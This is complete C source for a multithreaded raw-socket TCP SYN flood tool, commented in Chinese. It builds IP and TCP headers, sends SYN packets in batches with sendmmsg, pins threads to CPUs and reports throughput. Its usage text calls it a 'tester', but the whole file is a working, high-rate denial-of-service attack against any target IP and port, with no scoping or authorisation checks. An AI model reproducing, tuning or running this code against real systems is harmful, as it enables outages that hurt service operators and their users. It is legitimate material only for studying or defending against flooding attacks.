#define _GNU_SOURCE

#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <ifaddrs.h>
#include <errno.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/time.h>
#include <sys/uio.h>  // 添加批量发送支持

#define MAX_PACKET_SIZE 65535
#define MIN_PACKET_SIZE (int)(sizeof(struct iphdr) + sizeof(struct tcphdr))  // 明确转换为int
#define MAXTTL 255
#define MAX_PAYLOAD_SIZE 65000
#define SOCKET_BUFFER_SIZE (100 * 1024 * 1024)  // 100MB发送缓冲区
#define BATCH_SIZE 64  // 批量发送包数量

typedef struct {
    char *target_ip;
    char *source_ip;
    char *target_port;
    int packet_size;
    int thread_id;
    int sockfd;
    unsigned long packets;
    unsigned long bytes;
    struct sockaddr_in sin;
    char datagram[MAX_PACKET_SIZE]; 
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *payload;
    unsigned int seed;  // 每个线程有自己的随机数种子
} ThreadConfig;

volatile int running = 1;

char* get_local_ip(const char *interface) {
    struct ifaddrs *ifaddr, *ifa;
    char *ip = malloc(INET_ADDRSTRLEN);
    int found = 0;
    
    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL || ifa->ifa_addr->sa_family != AF_INET)
            continue;

        if (interface && strcmp(ifa->ifa_name, interface) != 0)
            continue;

        struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
        const char* addr = inet_ntoa(sa->sin_addr);
        
        if (strcmp(addr, "127.0.0.1") != 0) {
            strncpy(ip, addr, INET_ADDRSTRLEN);
            found = 1;
            break;
        }
    }

    freeifaddrs(ifaddr);
    
    if (!found) {
        fprintf(stderr, "Error: No suitable network interface found\n");
        exit(EXIT_FAILURE);
    }
    
    return ip;
}

unsigned short csum(unsigned short *buf, int count) {
    unsigned long sum = 0;
    while (count > 1) { 
        sum += *buf++;
        count -= 2;
    }
    
    if (count > 0) {
        sum += *(unsigned char *)buf;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    
    return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph, const char *source_ip, const char *dest_ip, int total_len) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(total_len);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(source_ip);
    iph->daddr = inet_addr(dest_ip);
    iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));
}

void setup_tcp_header(struct tcphdr *tcph, int src_port, int dest_port) {
    tcph->source = htons(src_port);
    tcph->dest = htons(dest_port);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->res1 = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htonl(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, void *payload, int payload_len) {
    struct {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead = {
        .src_addr = iph->saddr,
        .dst_addr = iph->daddr,
        .zero = 0,
        .proto = IPPROTO_TCP,
        .length = htons(sizeof(struct tcphdr) + payload_len)
    };
    
    static unsigned char buffer[sizeof(pseudohead) + sizeof(struct tcphdr) + MAX_PAYLOAD_SIZE];
    
    memcpy(buffer, &pseudohead, sizeof(pseudohead));
    memcpy(buffer + sizeof(pseudohead), tcph, sizeof(struct tcphdr));
    if (payload_len > 0) {
        memcpy(buffer + sizeof(pseudohead) + sizeof(struct tcphdr), payload, payload_len);
    }
    
    return csum((unsigned short *)buffer, sizeof(pseudohead) + sizeof(struct tcphdr) + payload_len);
}

void set_cpu_affinity(pthread_t thread, int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    
    if (pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset) != 0) {
        perror("pthread_setaffinity_np");
    }
}

// 高性能随机数生成器（每个线程有自己的种子）
static inline unsigned int fast_rand(unsigned int *seed) {
    *seed = (214013 * (*seed) + 2531011);
    return (*seed >> 16) & 0x7FFF;
}

void *flood(void *config_ptr) {
    ThreadConfig *config = (ThreadConfig *)config_ptr;
    
    // 创建原始套接字
    config->sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (config->sockfd < 0) {
        perror("socket");
        return NULL;
    }
    
    // 设置IP_HDRINCL选项
    int one = 1;
    if (setsockopt(config->sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(config->sockfd);
        return NULL;
    }
    
    // 设置大发送缓冲区（100MB）
    int sockbufsize = SOCKET_BUFFER_SIZE;
    if (setsockopt(config->sockfd, SOL_SOCKET, SO_SNDBUF, &sockbufsize, sizeof(sockbufsize)) < 0) {
        perror("setsockopt SO_SNDBUF");
    }
    
    // 设置为非阻塞模式
    int flags = fcntl(config->sockfd, F_GETFL, 0);
    if (flags == -1) {
        perror("fcntl F_GETFL");
    }
    if (fcntl(config->sockfd, F_SETFL, flags | O_NONBLOCK) == -1) {
        perror("fcntl O_NONBLOCK");
    }
    
    // 初始化目标地址结构
    memset(&config->sin, 0, sizeof(config->sin));
    config->sin.sin_family = AF_INET;
    config->sin.sin_addr.s_addr = inet_addr(config->target_ip);
    
    // 计算各部分大小
    int ip_hdr_len = sizeof(struct iphdr);
    int tcp_hdr_len = sizeof(struct tcphdr);
    
    // 自动调整包大小（确保不小于最小包大小）
    int actual_packet_size = config->packet_size;
    if (actual_packet_size < MIN_PACKET_SIZE) {
        actual_packet_size = MIN_PACKET_SIZE;
    }
    
    int payload_len = actual_packet_size - ip_hdr_len - tcp_hdr_len;
    
    if (payload_len < 0) {
        fprintf(stderr, "Error: Packet size too small. Minimum size is %d bytes\n", 
                MIN_PACKET_SIZE);
        close(config->sockfd);
        return NULL;
    }
    
    // 设置指针
    config->iph = (struct iphdr *)config->datagram;
    config->tcph = (struct tcphdr *)(config->datagram + ip_hdr_len);
    config->payload = config->datagram + ip_hdr_len + tcp_hdr_len;
    
    // 初始化随机负载
    char random_payload[MAX_PAYLOAD_SIZE];
    for (int i = 0; i < MAX_PAYLOAD_SIZE; i++) {
        random_payload[i] = fast_rand(&config->seed) & 0xFF;
    }
    
    // 预填充负载数据
    if (payload_len > 0) {
        memcpy(config->payload, random_payload, payload_len);
    }
    
    // 预计算数据包大小
    int packet_len = ip_hdr_len + tcp_hdr_len + payload_len;
    
    // 准备批量发送结构
    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iovs[BATCH_SIZE];
    struct sockaddr_in sins[BATCH_SIZE];
    
    for (int i = 0; i < BATCH_SIZE; i++) {
        iovs[i].iov_base = config->datagram;
        iovs[i].iov_len = packet_len;
        sins[i] = config->sin;
        
        msgs[i].msg_hdr.msg_name = &sins[i];
        msgs[i].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
    }
    
    // 主发送循环（使用批量发送）
    while (running) {
        // 准备批量数据包
        for (int i = 0; i < BATCH_SIZE; i++) {
            // 生成随机源端口
            int src_port = 1024 + (fast_rand(&config->seed) % 64512);
            
            // 设置IP头部
            setup_ip_header(config->iph, config->source_ip, config->target_ip, packet_len);
            
            // 设置TCP头部
            setup_tcp_header(config->tcph, src_port, atoi(config->target_port));
            
            // 计算TCP校验和
            config->tcph->check = tcpcsum(config->iph, config->tcph, config->payload, payload_len);
            
            // 更新目标端口
            sins[i].sin_port = config->tcph->dest;
        }
        
        // 批量发送
        int sent = sendmmsg(config->sockfd, msgs, BATCH_SIZE, 0);
        if (sent > 0) {
            config->packets += sent;
            config->bytes += sent * packet_len;
        } else {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // 缓冲区满，稍后重试
                usleep(1);
            } else {
                perror("sendmmsg");
                break;
            }
        }
    }
    
    close(config->sockfd);
    return NULL;
}

void *stats_thread(void *arg) {
    ThreadConfig *configs = (ThreadConfig *)arg;
    int num_threads = configs[0].packet_size;
    
    struct timeval start_time, current_time;
    gettimeofday(&start_time, NULL);
    
    unsigned long last_total_packets = 0;
    unsigned long last_total_bytes = 0;
    
    time_t last_print_time = time(NULL);
    int last_printed_seconds = 0;
    
    while (running) {
        sleep(1);
        gettimeofday(&current_time, NULL);
        
        double elapsed = (current_time.tv_sec - start_time.tv_sec) + 
                        (current_time.tv_usec - start_time.tv_usec) / 1000000.0;
        
        if (elapsed < 0.1) continue;
        
        // 汇总统计
        unsigned long total_packets = 0;
        unsigned long total_bytes = 0;
        for (int i = 0; i < num_threads; i++) {
            total_packets += configs[i].packets;
            total_bytes += configs[i].bytes;
        }
        
        double mbps = (total_bytes * 8) / (elapsed * 1000000.0);
        double pps = total_packets / elapsed;
        
        double inst_pps = total_packets - last_total_packets;
        double inst_mbps = (total_bytes - last_total_bytes) * 8 / 1000000.0;
        
        // 每秒打印一次
        time_t now = time(NULL);
        if (now > last_print_time) {
            printf("\r[%02ds] Pkts: %lu (%.2f pps | Inst: %.2f pps) | Bytes: %lu (%.2f Mbps | Inst: %.2f Mbps) | Threads: %d", 
                   (int)elapsed, total_packets, pps, inst_pps, 
                   total_bytes, mbps, inst_mbps, num_threads);
            fflush(stdout);
            last_print_time = now;
            last_printed_seconds = (int)elapsed;
        }
        
        last_total_packets = total_packets;
        last_total_bytes = total_bytes;
    }
    
    // 打印最终统计
    time_t now = time(NULL);
    double elapsed = difftime(now, start_time.tv_sec);
    if (elapsed < 0.1) elapsed = 0.1;
    
    unsigned long total_packets = 0;
    unsigned long total_bytes = 0;
    for (int i = 0; i < num_threads; i++) {
        total_packets += configs[i].packets;
        total_bytes += configs[i].bytes;
    }
    
    double mbps = (total_bytes * 8) / (elapsed * 1000000.0);
    double pps = total_packets / elapsed;
    
    printf("\r[%02ds] Pkts: %lu (%.2f pps) | Bytes: %lu (%.2f Mbps) | Threads: %d\n", 
           (int)elapsed, total_packets, pps, total_bytes, mbps, num_threads);
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 7) {
        printf("Ultra-High Performance SYN Flood Tester\n");
        printf("Usage: %s <target IP> <port> <threads> <duration> <packet size> <interface>\n", argv[0]);
        printf("Example: %s 192.168.1.100 80 16 60 100 eth0\n", argv[0]);
        printf("\nParameters:\n");
        printf("  <target IP>   : Target server IP address\n");
        printf("  <port>        : Target port number\n");
        printf("  <threads>     : Number of threads (1-2 per CPU core)\n");
        printf("  <duration>    : Test duration in seconds\n");
        printf("  <packet size> : Packet size in bytes (min: %d, 0 for min size)\n", MIN_PACKET_SIZE);
        printf("  <interface>   : Network interface (e.g., eth0)\n");
        exit(EXIT_FAILURE);
    }
    
    char *target_ip = argv[1];
    char *target_port = argv[2];
    int num_threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    int packet_size = atoi(argv[5]);
    char *interface = argv[6];
    
    if (num_threads < 1 || num_threads > 64) {
        fprintf(stderr, "Error: Thread count must be between 1 and 64\n");
        exit(EXIT_FAILURE);
    }
    
    // 处理包大小参数：0表示使用最小包大小
    if (packet_size <= 0) {
        packet_size = MIN_PACKET_SIZE;
        printf("Using minimum packet size: %d bytes\n", MIN_PACKET_SIZE);
    } else if (packet_size < MIN_PACKET_SIZE) {
        printf("Warning: Packet size too small. Using minimum size: %d bytes\n", MIN_PACKET_SIZE);
        packet_size = MIN_PACKET_SIZE;
    } else if (packet_size > MAX_PACKET_SIZE) {
        fprintf(stderr, "Error: Packet size exceeds maximum of %d bytes\n", MAX_PACKET_SIZE);
        exit(EXIT_FAILURE);
    }
    
    // 获取本地IP
    char *source_ip = get_local_ip(interface);
    printf("Source IP: %s\n", source_ip);
    printf("Target: %s:%s\n", target_ip, target_port);
    printf("Threads: %d | Duration: %ds | Packet Size: %d bytes\n\n", 
           num_threads, duration, packet_size);
    
    // 准备线程配置
    ThreadConfig *configs = malloc(num_threads * sizeof(ThreadConfig));
    if (!configs) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    
    // 初始化线程配置
    for (int i = 0; i < num_threads; i++) {
        configs[i].target_ip = target_ip;
        configs[i].source_ip = source_ip;
        configs[i].target_port = target_port;
        configs[i].packet_size = packet_size;
        configs[i].thread_id = i;
        configs[i].packets = 0;
        configs[i].bytes = 0;
        configs[i].sockfd = -1;
        configs[i].seed = (unsigned int)(time(NULL) ^ (unsigned long)pthread_self() ^ (i * 1234567));
    }
    
    // 创建线程
    pthread_t threads[num_threads];
    int cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
    
    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, flood, &configs[i]) != 0) {
            perror("pthread_create");
            exit(EXIT_FAILURE);
        }
        
        // 延迟设置CPU亲和性
        usleep(10000); // 10ms延迟确保线程启动
        set_cpu_affinity(threads[i], i % cpu_count);
    }
    
    printf("Using %d CPUs with %d threads\n", cpu_count, num_threads);
    printf("Starting flood... Press Ctrl+C to stop early\n");
    
    // 创建统计线程
    pthread_t stats_tid;
    configs[0].packet_size = num_threads;
    pthread_create(&stats_tid, NULL, stats_thread, configs);
    
    // 运行指定时间
    sleep(duration);
    running = 0;
    
    // 等待线程结束
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    pthread_join(stats_tid, NULL);
    
    // 最终统计
    unsigned long total_packets = 0;
    unsigned long total_bytes = 0;
    for (int i = 0; i < num_threads; i++) {
        total_packets += configs[i].packets;
        total_bytes += configs[i].bytes;
    }
    
    printf("\n\nTest completed.\n");
    printf("Total packets sent: %lu\n", total_packets);
    printf("Total bytes sent: %lu (%.2f MB)\n", 
           total_bytes, total_bytes / (1024.0 * 1024.0));
    if (duration > 0) {
        printf("Average pps: %.2f\n", total_packets / (double)duration);
        printf("Average bandwidth: %.2f Mbps\n", 
               (total_bytes * 8) / (duration * 1000000.0));
    }
    
    free(source_ip);
    free(configs);
    return 0;
}
